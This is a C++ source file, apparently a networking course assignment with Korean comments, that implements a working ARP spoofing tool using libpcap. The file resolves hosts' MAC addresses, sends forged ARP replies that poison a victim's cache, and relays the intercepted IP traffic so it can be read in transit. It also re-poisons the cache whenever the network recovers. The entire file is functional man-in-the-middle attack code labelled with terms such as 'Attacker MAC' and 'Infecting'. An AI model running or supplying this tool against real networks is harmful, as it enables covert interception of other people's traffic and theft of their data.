#include <cstdio>
#include <cstdlib>
#include <vector>
#include <ctime>
#include <unistd.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Flow {
    Ip senderIp;
    Mac senderMac;
    Ip targetIp;
    Mac targetMac;
};

// 내 MAC 주소 얻기
Mac getMyMac(const char* dev) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return Mac::nullMac();
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return Mac::nullMac();
    }
    close(sock);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

// ARP 요청 후 응답에서 MAC 얻기 + 디버깅용 로그 + 타임아웃
Mac getMacByArp(pcap_t* handle, Mac myMac, Ip ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(Ip("0.0.0.0")); // ARP 요청 발신자 IP
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(ip);

    printf("[*] Sending ARP request to %s\n", std::string(ip).c_str());
    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));

    time_t start = time(nullptr);
    while (true) {
        if (time(nullptr) - start > 5) {
            fprintf(stderr, "[-] Timeout waiting for ARP reply from %s\n", std::string(ip).c_str());
            return Mac::nullMac();
        }

        struct pcap_pkthdr* header;
        const u_char* recv;
        int res = pcap_next_ex(handle, &header, &recv);
        if (res <= 0) continue;

        auto* rep = (EthArpPacket*)recv;
        if (ntohs(rep->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(rep->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(rep->arp_.sip_) != ip) continue;

        Mac found = rep->arp_.smac_;
        printf("[+] ARP reply from %s: MAC = %s\n", std::string(ip).c_str(), std::string(found).c_str());
        return found;
    }
}

// 감염 ARP 전송
void sendArpInfect(pcap_t* handle, Mac myMac, const Flow& flow) {
    EthArpPacket packet;
    packet.eth_.dmac_ = flow.senderMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(flow.targetIp);
    packet.arp_.tmac_ = flow.senderMac;
    packet.arp_.tip_ = htonl(flow.senderIp);

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
}

// IP 패킷 릴레이
void relayIpPacket(pcap_t* handle, const u_char* packet, int len, const Flow& flow, Mac myMac) {
    auto* eth = (EthHdr*)packet;
    if (eth->type() != EthHdr::Ip4) return;
    if (!(eth->smac() == flow.senderMac && eth->dmac() == myMac)) return;

    u_char* relay = new u_char[len];
    memcpy(relay, packet, len);
    auto* rEth = (EthHdr*)relay;
    rEth->smac_ = myMac;
    rEth->dmac_ = flow.targetMac;

    pcap_sendpacket(handle, relay, len);
    delete[] relay;
}

// ARP 복구 감지
bool detectRecover(const u_char* packet, const Flow& flow) {
    auto* eth = (EthHdr*)packet;
    if (eth->type() != EthHdr::Arp) return false;
    auto* arp = (ArpHdr*)(packet + sizeof(EthHdr));
    return (arp->sip() == flow.targetIp && arp->tip() == flow.senderIp);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
        return 1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "[-] pcap_open_live() failed: %s\n", errbuf);
        return 1;
    }

    Mac myMac = getMyMac(dev);
    if (myMac.isNull()) {
        fprintf(stderr, "[-] Failed to get attacker MAC address\n");
        return 1;
    }
    printf("[*] Attacker MAC: %s\n", std::string(myMac).c_str());

    std::vector<Flow> flows;
    for (int i = 2; i < argc; i += 2) {
        Flow f;
        f.senderIp = Ip(argv[i]);
        f.targetIp = Ip(argv[i + 1]);
        f.senderMac = getMacByArp(handle, myMac, f.senderIp);
        f.targetMac = getMacByArp(handle, myMac, f.targetIp);
        flows.push_back(f);
    }

    for (const auto& f : flows) {
        printf("[+] Infecting %s (MAC: %s) to redirect to %s\n",
               std::string(f.senderIp).c_str(),
               std::string(f.senderMac).c_str(),
               std::string(f.targetIp).c_str());
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        for (const auto& flow : flows) {
            sendArpInfect(handle, myMac, flow);         // 감염 유지
            relayIpPacket(handle, packet, header->caplen, flow, myMac); // 릴레이
            if (detectRecover(packet, flow)) {
                printf("[!] Detected ARP recovery for %s, reinfecting...\n", std::string(flow.senderIp).c_str());
                sendArpInfect(handle, myMac, flow);
            }
        }
    }

    pcap_close(handle);
    return 0;
}
